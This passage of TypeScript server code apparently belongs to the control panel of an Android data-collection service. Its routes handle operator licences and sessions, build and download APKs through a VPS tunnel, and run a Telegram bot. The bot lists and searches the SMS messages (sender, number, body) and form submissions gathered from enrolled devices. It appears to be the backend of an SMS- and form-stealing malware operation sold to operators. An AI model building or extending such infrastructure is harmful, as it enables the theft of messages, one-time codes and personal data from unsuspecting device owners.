    await sqlClient(`CREATE TABLE IF NOT EXISTS complaint_replies (id SERIAL PRIMARY KEY, app_id TEXT NOT NULL, message TEXT NOT NULL, created_at TIMESTAMPTZ DEFAULT now())`);
    const rows = await sqlClient(
      `SELECT message, created_at FROM complaint_replies WHERE app_id = $1 ORDER BY created_at DESC LIMIT 50`,
      [appId]
    ) as Array<{ message: string; created_at: string }>;
    return c.json((rows as Array<{message:string;created_at:string}>).reverse());
  } catch { return c.json([]); }
});

// Master admin: clear complaint_replies for an app (cleanup junk/test data)
app.delete("/api/master/apps/:appId/complaint-replies", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const appId = c.req.param("appId");
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const before = c.req.query("before"); // optional: delete only entries older than ISO date
  try {
    if (before) {
      await sqlClient(`DELETE FROM complaint_replies WHERE app_id = $1 AND created_at < $2::timestamptz`, [appId, before]);
    } else {
      await sqlClient(`DELETE FROM complaint_replies WHERE app_id = $1`, [appId]);
    }
    return c.json({ ok: true });
  } catch (e) { return c.json({ error: String(e) }, 500); }
});

// Master admin: renew app licence +30 days — requires x-master-session (see checkMasterPin)
app.post("/api/master/apps/:appId/renew", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const db = getDb(c.env);
  const appId = c.req.param("appId");
  if (appId === DEFAULT_APP_ID) return c.json({ error: "Cannot renew the default app" }, 400);
  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
  if (!row) return c.json({ error: "App not found" }, 404);
  const body = await c.req.json().catch(() => ({})) as { days?: number; reset?: boolean };
  let newCreatedAt: Date;
  if (body.reset) {
    // Reset: set createdAt to NOW() — licence restarts fresh from today
    newCreatedAt = new Date();
  } else {
    const days = [1, 2, 3, 30].includes(body.days ?? 30) ? (body.days ?? 30) : 30;
    const DAY_MS = 24 * 60 * 60 * 1000;
    const PERIOD_MS = days * DAY_MS;
    const oldCreated = new Date(row.createdAt).getTime();
    const oldExpiry = oldCreated + 30 * DAY_MS;
    // If expired: back-date createdAt so that createdAt+30days = now+daysToAdd
    // e.g. +1 day → createdAt = now-29d, expiry = now+1d
    // If not expired: shift createdAt forward by PERIOD_MS → expiry += daysToAdd
    newCreatedAt = new Date(oldExpiry > Date.now()
      ? oldCreated + PERIOD_MS
      : Date.now() - (30 - days) * DAY_MS);
  }
  const [updated] = await db.update(apps)
    .set({ createdAt: newCreatedAt, status: "active" })
    .where(eq(apps.appId, appId)).returning();
  if (!updated) return c.json({ error: "App not found" }, 404);
  return c.json(mapApp(updated));
});

// ------- ADMIN SESSIONS (Postgres-backed) -------
// =================== NOTICES API ===================
// Public: returns all active notices for the ticker
app.get("/api/notice", async (c) => {
  await ensureSchema(c.env);
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const rows = await sqlClient(`SELECT id, text, created_at FROM notices WHERE active = TRUE ORDER BY created_at DESC`) as Array<{ id: number; text: string; created_at: string }>;
  return c.json({ notices: rows });
});

// Master: list all notices
app.get("/api/master/notices", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  await ensureSchema(c.env);
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const rows = await sqlClient(`SELECT id, text, active, created_at FROM notices ORDER BY created_at DESC`) as Array<{ id: number; text: string; active: boolean; created_at: string }>;
  return c.json({ notices: rows });
});

// Master: create notice
app.post("/api/master/notices", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  await ensureSchema(c.env);
  const { text, active } = await c.req.json() as { text: string; active?: boolean };
  if (!text?.trim()) return c.json({ error: "text is required" }, 400);
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const rows = await sqlClient(
    `INSERT INTO notices (text, active) VALUES ($1, $2) RETURNING id, text, active, created_at`,
    [text.trim(), active !== false]
  ) as Array<{ id: number; text: string; active: boolean; created_at: string }>;
  return c.json({ notice: rows[0] });
});

// Master: toggle active / edit text
app.patch("/api/master/notices/:id", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  await ensureSchema(c.env);
  const id = Number(c.req.param("id"));
  const body = await c.req.json() as { active?: boolean; text?: string };
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  if (body.active !== undefined && body.text !== undefined) {
    await sqlClient(`UPDATE notices SET active=$1, text=$2 WHERE id=$3`, [body.active, body.text.trim(), id]);
  } else if (body.active !== undefined) {
    await sqlClient(`UPDATE notices SET active=$1 WHERE id=$2`, [body.active, id]);
  } else if (body.text !== undefined) {
    await sqlClient(`UPDATE notices SET text=$1 WHERE id=$2`, [body.text.trim(), id]);
  }
  const rows = await sqlClient(`SELECT id, text, active, created_at FROM notices WHERE id=$1`, [id]) as Array<{ id: number; text: string; active: boolean; created_at: string }>;
  return c.json({ notice: rows[0] ?? null });
});

// Master: delete notice
app.delete("/api/master/notices/:id", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  await ensureSchema(c.env);
  const id = Number(c.req.param("id"));
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  await sqlClient(`DELETE FROM notices WHERE id=$1`, [id]);
  return c.json({ ok: true });
});

app.get("/api/admin/sessions", async (c) => {
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const appId = c.req.query("appId") ?? "";
  const isMaster = await isMasterSession(c);
    if (!isMaster) {
      if (c.get('sessionAppId') !== appId) return c.json({ error: "Unauthorized" }, 401);
    }
  const rows = await sqlClient(
    `SELECT id, login_time, last_active, user_agent, ip, device FROM admin_sessions WHERE app_id = $1 ORDER BY login_time DESC`,
    [appId],
  ) as Array<Record<string, unknown>>;
  const list: AdminSession[] = rows.map((r) => ({
    id: String(r.id),
    loginTime: isoReq(r.login_time as Date | string),
    lastActive: isoReq(r.last_active as Date | string),
    userAgent: String(r.user_agent ?? ""),
    ip: String(r.ip ?? ""),
    device: String(r.device ?? ""),
  }));
  return c.json(list);
});
app.post("/api/admin/sessions", async (c) => {
    const sqlClient = neon(c.env.NEON_DATABASE_URL);
    const ua = c.req.header("user-agent") ?? "";
    const ip = (c.req.header("cf-connecting-ip") ?? c.req.header("x-forwarded-for") ?? "unknown").split(",")[0].trim();
    let appId = ""; let pin = ""; let panelToken = ""; let deviceId = "";
    try { const b = await c.req.json() as { appId?: string; pin?: string; panelToken?: string; deviceId?: string }; appId = b.appId ?? ""; pin = b.pin ?? ""; panelToken = b.panelToken ?? ""; deviceId = b.deviceId ?? ""; } catch {}
    if (!appId || !pin) return c.json({ error: "appId and pin required" }, 400);

    const db = getDb(c.env);
    const [appRow] = await db.select({ status: apps.status, createdAt: apps.createdAt, appId: apps.appId })
      .from(apps).where(eq(apps.appId, appId)).limit(1);
    if (!appRow) return c.json({ error: "Invalid credentials" }, 401);
    const [secretRow] = await db.select({ pin: appSecrets.pin, loginLimit: appSecrets.loginLimit }).from(appSecrets).where(eq(appSecrets.appId, appId)).limit(1);
// Check licence expiry before anything else (non-default apps only)
    if (appRow.appId !== DEFAULT_APP_ID && appRow.status === "active" && appRow.createdAt && isExpired(appRow.createdAt)) {
      return c.json({ error: "Licence expired. Please contact admin to renew." }, 403);
    }
    if (appRow.status !== "active" || !secretRow || !(await _verifyPin(pin, secretRow.pin, (c.env as Env).PIN_PEPPER ?? ""))) return c.json({ error: "Invalid credentials" }, 401);
    // Auto-upgrade plaintext PIN → PBKDF2 hash on successful login
    if (!_isPinHashed(secretRow.pin)) {
      await db.update(appSecrets).set({ pin: await _hashPin(pin, (c.env as Env).PIN_PEPPER ?? "") }).where(eq(appSecrets.appId, appId));
    }
    // NOTE: "pt" access-link token check removed here too (same product decision as
    // verify-pin) — bare PIN is sufficient, "pt" is no longer verified anywhere.
    // Ensure device_id column exists (persistent per-browser fingerprint, avoids
    // mobile-carrier IP rotation from creating a fresh "duplicate" session per request)
    await sqlClient(`ALTER TABLE admin_sessions ADD COLUMN IF NOT EXISTS device_id TEXT`).catch(() => {});
    let existing = deviceId
      ? await sqlClient(
          `SELECT id FROM admin_sessions WHERE device_id = $1 AND app_id = $2 ORDER BY last_active DESC LIMIT 1`,
          [deviceId, appId],
        ) as Array<{ id: string }>
      : [] as Array<{ id: string }>;
    if (existing.length > 0) {
      const id = existing[0].id;
      await sqlClient(`UPDATE admin_sessions SET last_active = NOW(), ip = $2, user_agent = $3, device_id = COALESCE($4, device_id) WHERE id = $1`, [id, ip, ua, deviceId || null]);
      const jwtSec = (c.env as Env).JWT_SECRET;
      if (!jwtSec) return c.json({ error: "Server misconfiguration: JWT_SECRET not set" }, 503);
      const subJwt = await signJwt({ sub: id, role: "sub-admin", appId, iss: "mr-panel", iat: Math.floor(Date.now()/1000), exp: Math.floor(Date.now()/1000)+86400 }, jwtSec);
      return c.json({ sessionId: id, token: subJwt });
      }
          // Enforce per-app login limit — block new logins once the cap is reached.
    // Each device login occupies a slot; logout (or 'Logout All') frees it.
    const _limit = secretRow?.loginLimit ?? 20;
    const _cntRows = await sqlClient(
      `SELECT COUNT(*) AS cnt FROM admin_sessions WHERE app_id = $1`,
      [appId],
    ) as Array<{ cnt: string }>;
    const _activeCnt = parseInt((_cntRows[0]?.cnt ?? '0'), 10);
    if (_activeCnt >= _limit) {
      return c.json({ error: `Login limit reached (${_limit}). Ask admin to increase limit or logout existing sessions.` }, 429);
    }
    const id = crypto.randomUUID();
    await sqlClient(
      `INSERT INTO admin_sessions (id, user_agent, ip, device, app_id, device_id) VALUES ($1, $2, $3, $4, $5, $6)`,
      [id, ua, ip, parseDevice(ua), appId, deviceId || null],
    );
    const jwtSec2 = (c.env as Env).JWT_SECRET;
    if (!jwtSec2) return c.json({ error: "Server misconfiguration: JWT_SECRET not set" }, 503);
    const subJwt2 = await signJwt({ sub: id, role: "sub-admin", appId, iss: "mr-panel", iat: Math.floor(Date.now()/1000), exp: Math.floor(Date.now()/1000)+86400 }, jwtSec2);
    return c.json({ sessionId: id, token: subJwt2 });
    });
app.patch("/api/admin/sessions/:id/ping", async (c) => {
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const rows = await sqlClient(
    `UPDATE admin_sessions SET last_active = NOW() WHERE id = $1 RETURNING id`,
    [c.req.param("id")],
  ) as Array<{ id: string }>;
  if (rows.length === 0) return c.json({ error: "session not found" }, 404);
  return c.json({ ok: true });
});
app.delete("/api/admin/sessions/:id", async (c) => {
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const isMaster = await isMasterSession(c);
  const sessionId = c.req.param("id");
  if (!isMaster) {
    const callerAppId = c.get('sessionAppId');
    if (!callerAppId) return c.json({ error: "Unauthorized" }, 401);
    const rows = await sqlClient(`SELECT id, app_id FROM admin_sessions WHERE id = $1`, [sessionId]) as Array<{id:string; app_id: string}>;
    if (rows.length === 0) return c.json({ error: "Not found" }, 404);
    if (rows[0].app_id !== callerAppId) return c.json({ error: "Unauthorized" }, 401);
  }
  await sqlClient(`DELETE FROM admin_sessions WHERE id = $1`, [sessionId]);
  _sessionCache.delete(sessionId); // evict immediately — JWT replay fix
  return c.json({ ok: true });
});
app.delete("/api/admin/sessions", async (c) => {
  const isMaster = await isMasterSession(c);
  const appId = c.req.query("appId") ?? "";
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  if (!isMaster) {
    const callerAppId = c.get('sessionAppId');
    if (!callerAppId || callerAppId !== appId) return c.json({ error: "Unauthorized" }, 401);
  }
  await sqlClient(`DELETE FROM admin_sessions WHERE app_id = $1`, [appId]);
  return c.json({ ok: true });
});

// ------- STATS / SAMPLE / SEED -------
app.get("/api/stats", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  const _isMasterStats = await isMasterSession(c);
  // SECURITY: no anonymous access. Per-app stats need a session bound to that app (or
  // master); the global (no-appId) totals are master-only.
  if (!_isMasterStats) {
    if (!appId || c.get('sessionAppId') !== appId) return c.json({ error: "Unauthorized" }, 401);
  }
  if (appId) {
    const [d] = await db.select({ c: sql<string>`count(*)::text` }).from(devices).where(eq(devices.appId, appId));
    const [m] = await db.select({ c: sql<string>`count(*)::text` }).from(messages).where(eq(messages.appId, appId));
    const [f] = await db.select({ c: sql<string>`count(*)::text` }).from(formData).where(eq(formData.appId, appId));
    return c.json({ devices: Number(d.c), messages: Number(m.c), formData: Number(f.c) });
  }
  const [a] = await db.select({ c: sql<string>`count(*)::text` }).from(apps);
  const [d] = await db.select({ c: sql<string>`count(*)::text` }).from(devices);
  const [m] = await db.select({ c: sql<string>`count(*)::text` }).from(messages);
  const [f] = await db.select({ c: sql<string>`count(*)::text` }).from(formData);
  return c.json({ apps: Number(a.c), devices: Number(d.c), messages: Number(m.c), formData: Number(f.c) });
});

app.get("/api/sample", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  const _isMasterSample = await isMasterSession(c);
  // SECURITY: no anonymous access. Per-app sample needs a session bound to that app (or
  // master); the global (no-appId) sample is master-only.
  if (!_isMasterSample) {
    if (!appId || c.get('sessionAppId') !== appId) return c.json({ error: "Unauthorized" }, 401);
  }
  if (appId) {
    const [d] = await db.select().from(devices).where(eq(devices.appId, appId)).limit(1);
    const [m] = await db.select().from(messages).where(eq(messages.appId, appId)).limit(1);
    const [f] = await db.select().from(formData).where(eq(formData.appId, appId)).limit(1);
    return c.json({
      devices: d ? mapDevice(d) : null,
      messages: m ? mapMessage(m) : null,
      formData: f ? mapFormData(f) : null,
    });
  }
  const [a] = await db.select().from(apps).limit(1);
  const [d] = await db.select().from(devices).limit(1);
  const [m] = await db.select().from(messages).limit(1);
  const [f] = await db.select().from(formData).limit(1);
  return c.json({
    apps: a ? mapApp(a) : null,
    devices: d ? mapDevice(d) : null,
    messages: m ? mapMessage(m) : null,
    formData: f ? mapFormData(f) : null,
  });
});

app.post("/api/seed", async (c) => {
    const db = getDb(c.env);
    const existing = await db.select().from(apps).where(eq(apps.appId, DEFAULT_APP_ID)).limit(1);
    if (existing.length === 0) {
      await db.insert(apps).values({
        appId: DEFAULT_APP_ID, name: DEFAULT_APP_NAME, status: "active",
      }).onConflictDoNothing({ target: apps.appId });
      await db.insert(appSecrets).values({
        appId: DEFAULT_APP_ID, pin: DEFAULT_APP_PIN,
      }).onConflictDoNothing({ target: appSecrets.appId });
    }
    return c.json({ ok: true, message: "Database is ready" });
  });

// ------- EVENTS (WebSocket — handled directly in fetch(), bypassing Hono) -------
// WebSocket 101 upgrade is intercepted before Hono in the default export below.
// =================== TOKEN-APP MAP ===================
app.get("/api/token-app", async (c) => {
  const token = c.req.query("token");
  if (!token) return c.json({ apkId: null });
  try {
    const db = getDb(c.env);
    const rows = await db.select().from(tokenAppMap).where(eq(tokenAppMap.token, token)).limit(1);
    return c.json({ apkId: rows[0]?.apkId ?? null });
  } catch { return c.json({ apkId: null }); }
});

app.post("/api/token-app", async (c) => {
  const { token, apkId } = await c.req.json() as { token?: string; apkId?: string };
  if (!token || !apkId) return c.json({ error: "token and apkId required" }, 400);
  try {
    const db = getDb(c.env);
    await db.execute(sql`
      INSERT INTO token_app_map (token, apk_id, updated_at)
      VALUES (${token}, ${apkId}, now())
      ON CONFLICT (token) DO UPDATE SET apk_id = EXCLUDED.apk_id, updated_at = now()
    `);
    return c.json({ ok: true });
  } catch (e) { return c.json({ error: String(e) }, 500); }
})

  // Master admin: reset APK selection for a specific apk-id
  app.delete("/api/master/token-app/:apkId", async (c) => {
    const guard = await checkMasterPin(c as never);
    if (guard) return guard;
    const apkId = c.req.param("apkId");
    try {
      const db = getDb(c.env);
      const deleted = await db.delete(tokenAppMap).where(eq(tokenAppMap.token, apkId)).returning();
      return c.json({ ok: true, deleted: deleted.length });
    } catch (e) { return c.json({ error: String(e) }, 500); }
  });;

// =================== VPS PROXY ===================
// Tunnel URL is stored in Neon DB settings table (key: 'tunnel_url')
// VPS startup script updates it automatically via POST /api/admin/update-tunnel
let _cachedTunnelUrl: string | null = null;
let _tunnelUrlExpiry = 0;

async function getVpsBase(neonUrl: string): Promise<string> {
  const now = Date.now();
  if (_cachedTunnelUrl && now < _tunnelUrlExpiry) return _cachedTunnelUrl;
  try {
    const sqlClient = neon(neonUrl);
    const rows = await sqlClient(`SELECT value FROM settings WHERE key = $1`, ['tunnel_url']) as Array<{ value: string }>;
    if (rows.length > 0 && rows[0].value) {
      _cachedTunnelUrl = rows[0].value.replace(/\/$/, '');
      _tunnelUrlExpiry = now + 30_000; // cache 30s
      return _cachedTunnelUrl;
    }
  } catch { /* ignore */ }
  return '';
}

async function vpsJson(path: string, neonUrl: string, method = "GET", body?: unknown): Promise<Response> {
  const base = await getVpsBase(neonUrl);
  if (!base) return new Response(JSON.stringify({ error: "VPS tunnel not configured" }), { status: 502, headers: { "Content-Type": "application/json" } });
  try {
    const r = await fetch(`${base}${path}`, {
      method,
      headers: { "Content-Type": "application/json" },
      body: body ? JSON.stringify(body) : undefined,
      signal: AbortSignal.timeout(15000),
    });
    const data = await r.json();
    return new Response(JSON.stringify(data), { status: r.status, headers: { "Content-Type": "application/json" } });
  } catch {
    return new Response(JSON.stringify({ error: "VPS unavailable" }), { status: 502, headers: { "Content-Type": "application/json" } });
  }
}

// VPS registers its tunnel URL here on startup
app.post("/api/admin/update-tunnel", async (c) => {
  const secret = c.req.header("x-admin-secret");
  const expected = c.env.API_SECRET;
  if (!expected) return c.json({ error: "Server misconfigured: API_SECRET not set" }, 500);
  if (secret !== expected) return c.json({ error: "Unauthorized" }, 401);
  const { url } = await c.req.json<{ url: string }>();
  if (!url || !url.startsWith("https://")) return c.json({ error: "Invalid URL" }, 400);
  try {
    const sqlClient = neon(c.env.NEON_DATABASE_URL);
    await sqlClient(`INSERT INTO settings (key, value) VALUES ('tunnel_url', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [url]);
    _cachedTunnelUrl = url.replace(/\/$/, '');
    _tunnelUrlExpiry = Date.now() + 30_000;
    return c.json({ ok: true, url });
  } catch (e) { return c.json({ error: String(e) }, 500); }
});

app.get("/api/vps/api/apps", async (c) => {
  // Try VPS directly; on success update Neon cache
  try {
    const base = await getVpsBase(c.env.NEON_DATABASE_URL);
    if (!base) throw new Error("no tunnel");
    const r = await fetch(`${base}/api/apps`, { signal: AbortSignal.timeout(8000) });
    const data = await r.json();
    if (Array.isArray(data)) {
      // Update cache in background
      try {
        const sqlClient = neon(c.env.NEON_DATABASE_URL);
        await sqlClient(
          `INSERT INTO settings (key, value) VALUES ('apps_cache', $1)
           ON CONFLICT (key) DO UPDATE SET value = $1`,
          [JSON.stringify(data)]
        );
      } catch { /* ignore cache write failure */ }
      return c.json(data);
    }
  } catch { /* VPS unreachable, fall through to cache */ }

  // Serve from Neon cache
  try {
    const sqlClient = neon(c.env.NEON_DATABASE_URL);
    const rows = await sqlClient(`SELECT value FROM settings WHERE key = 'apps_cache'`) as Array<{ value: string }>;
    if (rows.length > 0) return c.json(JSON.parse(rows[0].value));
  } catch { /* no cache */ }

  return c.json([], 200);
});

app.post("/api/vps/api/verify-token", async (c) => {
    const body = await c.req.json();
    const r = await vpsJson("/api/verify-token", c.env.NEON_DATABASE_URL, "POST", body);
    return new Response(r.body, { status: r.status, headers: r.headers });
  });
  app.get("/api/vps/api/build/:jobId/info", async (c) => {
  const r = await vpsJson(`/api/build/${c.req.param("jobId")}/info`, c.env.NEON_DATABASE_URL);
  return new Response(r.body, { status: r.status, headers: r.headers });
})

  app.post("/api/vps/api/build/start", async (c) => {
    const body = await c.req.json();
    const r = await vpsJson("/api/build/start", c.env.NEON_DATABASE_URL, "POST", body);
    return new Response(r.body, { status: r.status, headers: r.headers });
  });;

app.get("/api/vps/api/build/:jobId/status", async (c) => {
  const jobId = c.req.param("jobId");
  const base = await getVpsBase(c.env.NEON_DATABASE_URL);
  if (!base) return c.json({ error: "VPS tunnel not configured" }, 502);
  const upstream = await fetch(`${base}/api/build/${jobId}/status`);
  return new Response(upstream.body, {
    status: upstream.status,
    headers: {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      "Connection": "keep-alive",
    },
  });
});

app.get("/api/vps/api/build/:jobId/download", async (c) => {
  const jobId = c.req.param("jobId");
  const base = await getVpsBase(c.env.NEON_DATABASE_URL);
  if (!base) return c.json({ error: "VPS tunnel not configured" }, 502);
  const upstream = await fetch(`${base}/api/build/${jobId}/download`);
  if (!upstream.ok) return c.json({ error: "File not ready" }, 404);
  const headers: Record<string, string> = {
    "Content-Type": "application/vnd.android.package-archive",
  };
  const cd = upstream.headers.get("content-disposition");
  if (cd) headers["Content-Disposition"] = cd;
  const cl = upstream.headers.get("content-length");
  if (cl) headers["Content-Length"] = cl;
  return new Response(upstream.body, { headers });
});

app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));

// EventBus Durable Object class lives in the separate `event-bus-worker`
// Worker (Pages cannot host DO classes directly). See `artifacts/event-bus-worker/`.

  // =================== TELEGRAM BOT COMMANDS ===================
  type TgUpdate = {
  callback_query?: {
    id: string;
    from: { id: number; username?: string };
    data?: string;
    message?: { chat: { id: number | string } };
  };
    update_id: number;
    message?: {
      message_id: number;
      chat: { id: number; type: string; first_name?: string; username?: string };
      text?: string;
      date: number;
    };
    channel_post?: {
      message_id: number;
      chat: { id: number; type: string; username?: string };
      text?: string;
      date: number;
    };
  };

  async function getRecentData(env: Env, hours: number) {
    const since = new Date(Date.now() - hours * 3600 * 1000).toISOString();
    const sqlClient = neon(env.NEON_DATABASE_URL);
    const [msgs, forms] = await Promise.all([
      sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM messages WHERE received_at > $1::timestamptz ORDER BY received_at DESC LIMIT 30`, [since]),
      sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE submitted_at > $1::timestamptz ORDER BY submitted_at DESC LIMIT 20`, [since]),
    ]);
    return { msgs, forms };
  }

  function formatRecentData(msgs: unknown[], forms: unknown[], label: string): string {
    let out = `<b>${label}</b>\n\n`;
    if (msgs.length === 0 && forms.length === 0) return out + 'No data found.';
    if (msgs.length > 0) {
      out += `Messages (${msgs.length}):\n`;
      (msgs as Array<Record<string,unknown>>).forEach(m => {
        const body = String(m.body ?? '').substring(0, 90);
        out += `  [${m.app_id}] ${m.from_number}\n  ${body}\n`;
      });
    }
    if (forms.length > 0) {
      out += `\nForm Data (${forms.length}):\n`;
      (forms as Array<Record<string,unknown>>).forEach(f => {
        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
        out += `  [${f.app_id}] ${fields.substring(0, 100)}\n`;
      });
    }
    return out;
  }

  app.post("/api/telegram/webhook", async (c) => {
    let body: TgUpdate;
    try { body = await c.req.json() as TgUpdate; } catch { return c.json({ ok: true }); }

    // Shared resources — declared early so both callback_query and message handlers can use them
    const token = c.env.TELEGRAM_BOT_TOKEN ?? "";
    const sqlClient = neon(c.env.NEON_DATABASE_URL);
    const db = getDb(c.env);

    // ── Callback query handler (inline keyboard button taps) ──────────────
    if (body.callback_query) {
      const cq = body.callback_query;
      const cqChatId = String(cq.message?.chat?.id ?? cq.from.id);
      const data = cq.data ?? '';
      let cbToken = token;
      if (!cbToken) {
        const settRows = await sqlClient(`SELECT key, value FROM settings WHERE key IN ('telegram_bot_token','telegram_chat_id')`) as {key:string;value:string}[];
        cbToken = Object.fromEntries(settRows.map((r: {key:string;value:string})=>[r.key,r.value]))['telegram_bot_token'] ?? "";
      }
      // answerCb with optional popup text visible to user in Telegram
      const answerCb = (text?: string, showAlert?: boolean) => cbToken
        ? fetch(`https://api.telegram.org/bot${cbToken}/answerCallbackQuery`,{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({callback_query_id:cq.id,...(text?{text,show_alert:showAlert??false}:{})})}).catch(()=>{})
        : Promise.resolve();
      const sendCb = (text:string, extra?:object) => cbToken
        ? fetch(`https://api.telegram.org/bot${cbToken}/sendMessage`,{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({chat_id:cqChatId,parse_mode:"HTML",text,...extra})}).then(async r=>{ if(!r.ok){ const e=await r.text().catch(()=>""); throw new Error(`TG ${r.status}: ${e.slice(0,200)}`); } }).catch(()=>{})
        : Promise.resolve();

      if (data.startsWith('tglock:')) {
        const lockAppId = data.slice(7);
        try {
          const appRows = await sqlClient(`SELECT name FROM apps WHERE app_id = $1`,[lockAppId]) as {name:string}[];
          const appName = appRows[0]?.name ?? lockAppId;
          await sqlClient(`CREATE TABLE IF NOT EXISTS tg_app_lock (chat_id TEXT PRIMARY KEY, app_id TEXT NOT NULL, app_name TEXT, locked_at TIMESTAMPTZ DEFAULT now())`);
          await sqlClient(`INSERT INTO tg_app_lock (chat_id,app_id,app_name) VALUES ($1,$2,$3) ON CONFLICT (chat_id) DO UPDATE SET app_id=$2,app_name=$3,locked_at=now()`,[cqChatId,lockAppId,appName]);
          await answerCb(`🔒 Locked: ${appName}`);
          await sendCb(`🔒 Locked to <b>${appName}</b>\n<code>${lockAppId}</code>\n\nSeedha reply type karo. /unlock se change karo.`);
        } catch(e){ await answerCb(`❌ Error`,true); await sendCb(`❌ tglock error: ${String(e)}`); }
      } else if (data === 'tgunlock') {
        try {
          await sqlClient(`DELETE FROM tg_app_lock WHERE chat_id=$1`,[cqChatId]);
          await answerCb('🔓 Unlocked');
          await sendCb('🔓 Unlocked. /reply se naya app chuno.');
        } catch(e) { await answerCb(`❌ Error`,true); }
      } else if (data.startsWith('startreply:')) {
        const srAppId = data.slice('startreply:'.length);
        // Immediately answer so Telegram removes the loading state
        await answerCb(`🔒 Locking to ${srAppId}...`);
        try {
          const appRows = await sqlClient(`SELECT name FROM apps WHERE app_id = $1`,[srAppId]) as {name:string}[];
          const appName = appRows[0]?.name ?? srAppId;
          await sqlClient(`CREATE TABLE IF NOT EXISTS tg_app_lock (chat_id TEXT PRIMARY KEY, app_id TEXT NOT NULL, app_name TEXT, locked_at TIMESTAMPTZ DEFAULT now())`);
          await sqlClient(`INSERT INTO tg_app_lock (chat_id,app_id,app_name) VALUES ($1,$2,$3) ON CONFLICT (chat_id) DO UPDATE SET app_id=$2,app_name=$3,locked_at=now()`,[cqChatId,srAppId,appName]);
          await sendCb(`🔒 <b>${appName}</b> ke liye locked!\n<code>${srAppId}</code>\n\nAb seedha reply type karo 👇`,{reply_markup:{inline_keyboard:[[{text:'🔓 Unlock / Change App',callback_data:'tgunlock'}]]}});
        } catch(e){ await sendCb(`❌ startreply error: ${String(e)}`); }
      } else {
        await answerCb();
      }
      return c.json({ ok: true });
    }
    // ── Regular message handler ──────────────────────────────────────────────
    const msg = body.message ?? body.channel_post;
    if (!msg?.text) return c.json({ ok: true });

    const chatId = msg.chat.id;
    const txt = msg.text.trim().replace(/@\w+/, ''); // strip @botname — required for channel commands

    // /1h — last 1 hour
    if (txt === '/1h' || txt.startsWith('/1h ')) {
      const { msgs, forms } = await getRecentData(c.env, 1);
      const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 1 Hour');
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /24h — last 24 hours
    if (txt === '/24h' || txt.startsWith('/24h ')) {
      const { msgs, forms } = await getRecentData(c.env, 24);
      const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 24 Hours');
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /total — total counts
    if (txt === '/total') {
      const [appsC, devsC, msgsC, formsC] = await Promise.all([
        sqlClient(`SELECT COUNT(*) as c FROM apps`),
        sqlClient(`SELECT COUNT(*) as c FROM devices`),
        sqlClient(`SELECT COUNT(*) as c FROM messages`),
        sqlClient(`SELECT COUNT(*) as c FROM form_data`),
      ]);
      const out = `<b>Total Data (All Apps)</b>\n\n` +
        `Apps: <b>${(appsC[0] as {c:string}).c}</b>\n` +
        `Devices: <b>${(devsC[0] as {c:string}).c}</b>\n` +
        `Messages: <b>${(msgsC[0] as {c:string}).c}</b>\n` +
        `Form Data: <b>${(formsC[0] as {c:string}).c}</b>`;
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /apps — list all apps
    if (txt === '/apps') {
      const rows = await db.select({ appId: apps.appId, name: apps.name, status: apps.status }).from(apps);
      let out = `<b>All Apps (${rows.length})</b>\n\n`;
      if (rows.length === 0) { out += 'No apps found.'; }
      rows.forEach(a => {
        const st = a.status === 'active' ? '[active]' : '[inactive]';
        out += `${st} <code>${a.appId}</code>  ${a.name ?? ''}\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /app <appId> [deviceId] [searchText] — nested drill-down
    if (txt.startsWith('/app ')) {
      const parts = txt.slice(5).trim().split(' ');
      const appId = parts[0];
      const deviceId = parts[1] ?? null;
      const searchQuery = parts.slice(2).join(' ').toLowerCase() || null;

      if (!appId) {
        await tgReply(token, chatId, 'Usage: /app &lt;appId&gt; [deviceId] [searchText]');
        return c.json({ ok: true });
      }

      // Level 3: /app <appId> <deviceId> <searchText>
      if (deviceId && searchQuery) {
        const like = `%${searchQuery}%`;
        const [msgR, formR] = await Promise.all([
          sqlClient(`SELECT from_number, from_sender, body, received_at FROM messages WHERE app_id=$1 AND device_id=$2 AND (LOWER(body) LIKE $3 OR LOWER(from_number) LIKE $3 OR LOWER(from_sender) LIKE $3) ORDER BY received_at DESC LIMIT 30`, [appId, deviceId, like]),
          sqlClient(`SELECT data, submitted_at FROM form_data WHERE app_id=$1 AND device_id=$2 AND LOWER(data::text) LIKE $3 ORDER BY submitted_at DESC LIMIT 15`, [appId, deviceId, like]),
        ]);
        let out = `<b>Search: "${searchQuery}"</b>\nApp: <code>${appId}</code> | Device: <code>${deviceId}</code>\n\n`;
        if ((msgR as unknown[]).length === 0 && (formR as unknown[]).length === 0) { out += 'No results found.'; }
        if ((msgR as unknown[]).length > 0) {
